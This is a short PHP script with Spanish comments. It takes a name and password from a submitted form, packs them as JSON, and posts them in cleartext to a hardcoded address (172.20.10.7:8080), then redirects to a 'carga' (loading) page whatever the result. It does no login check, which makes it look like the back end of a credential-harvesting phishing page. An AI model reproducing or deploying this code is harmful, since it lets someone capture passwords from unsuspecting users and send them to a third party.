<?php
// Recibir los datos del formulario
$nombre = $_POST['nombre'];
$contrasena = $_POST['contrasena'];
 
// Crear el array de datos
$datos = array(
    'nombre' => $nombre,
    'contrasena' => $contrasena
);
 
// Convertir el array a formato JSON
$json_datos = json_encode($datos);
 
// Configurar la URL del servidor
$server_url = 'http://172.20.10.7:8080';
 
// Configurar la solicitud HTTP
$options = array(
    'http' => array(
        'header'  => "Content-type: application/json\r\n",
        'method'  => 'POST',
        'content' => $json_datos,
    ),
);
 
// Crear un contexto de flujo
$context  = stream_context_create($options);
 
// Realizar la solicitud al servidor
$response = file_get_contents($server_url, false, $context);
 
// Manejar la respuesta (puedes personalizar según tus necesidades)
if ($response === FALSE) {
    // Redireccionar a carga.php en caso de error
    header("Location: carga.php");
    exit(); // Asegura que el script se detenga después de la redirección
} else {
    // Redireccionar a carga.php en caso de éxito
    header("Location: carga.php");
    exit(); // Asegura que el script se detenga después de la redirección
}
?>
